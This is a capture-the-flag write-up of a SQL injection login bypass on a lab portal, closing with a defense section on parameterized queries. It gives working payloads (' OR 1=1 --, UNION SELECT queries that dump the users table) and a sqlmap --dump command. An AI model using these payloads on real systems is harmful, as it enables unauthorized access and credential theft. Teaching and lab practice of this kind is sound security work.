# SQL Injection: Login Bypass

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Points** | 200 |
| **Flag** | `CTF{sql_1nj3ct10n_m4st3r}` |
| **Tools** | Burp Suite, sqlmap |

## Challenge Description

> "Our new employee portal is ready for launch. We're confident the login system is secure. Can you prove us wrong?"
>
> A login form is provided at `http://challenge.ctf.local:8080/login`. Find a way to authenticate without valid credentials and retrieve the flag from the admin dashboard.

## Reconnaissance

The login page presents a standard username/password form. Submitting test credentials returns "Invalid username or password." Viewing the page source reveals nothing unusual: no hidden fields or client-side validation beyond basic HTML.

I intercepted the login request with Burp Suite to see the raw POST data:

```http
POST /login HTTP/1.1
Host: challenge.ctf.local:8080
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123
```

## Testing for SQL Injection

The first step is determining whether the input fields are vulnerable. I entered a single quote in the username field:

```
Username: admin'
Password: anything
```

The server responded with a 500 Internal Server Error, which is a strong indicator that user input is being concatenated directly into a SQL query. A properly parameterized query would handle this gracefully.

The backend query is likely structured as:

```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{input}'
```

## Exploitation: Authentication Bypass

### Basic Bypass

The classic payload terminates the intended query and injects a condition that always evaluates to true:

```
Username: ' OR 1=1 --
Password: anything
```

This transforms the query into:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
```

Everything after `--` is a comment, so the password check is eliminated. The `OR 1=1` returns all rows, and the application logs us in as the first user in the table: typically the admin.

This granted access to the admin dashboard, where the flag was displayed: `CTF{sql_1nj3ct10n_m4st3r}`

### UNION-Based Data Extraction

To demonstrate the full severity of the vulnerability, I used UNION injection to extract the database schema. First, determine the number of columns:

```
' ORDER BY 1 -- (works)
' ORDER BY 2 -- (works)
' ORDER BY 3 -- (error: table has 2 columns)
```

Then enumerate the database:

```
' UNION SELECT table_name, NULL FROM information_schema.tables --
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username, password FROM users --
```

This revealed all user credentials stored in plaintext: another critical vulnerability.

### Automated Extraction with sqlmap

```bash
sqlmap -u "http://challenge.ctf.local:8080/login" \
  --data="username=admin&password=test" \
  --method POST \
  -p username \
  --dbs \
  --dump
```

sqlmap confirmed the MySQL backend, enumerated all databases, and dumped the `users` table automatically.

## Underlying Vulnerability

The application builds SQL queries through string concatenation with unsanitized user input. This is the textbook cause of SQL injection and remains in the OWASP Top 10 (A03:2021: Injection).

## Defense and Mitigation

**Parameterized queries** are the primary defense. Never concatenate user input into SQL:

```python
# VULNERABLE: do not use
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# SECURE: parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

Additional layers of defense:

- **Input validation**: Reject or sanitize special characters where they are not expected.
- **Least privilege**: The database account used by the application should have only the permissions it needs: no DROP, no access to `information_schema`.
- **WAF rules**: A web application firewall can catch common injection patterns, though this is defense-in-depth, not a primary control.
- **Error handling**: Never expose raw SQL errors to users. Return generic error messages and log details server-side.
- **ORM usage**: Frameworks like SQLAlchemy or Django ORM generate parameterized queries by default.

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [sqlmap Documentation](https://sqlmap.org/)
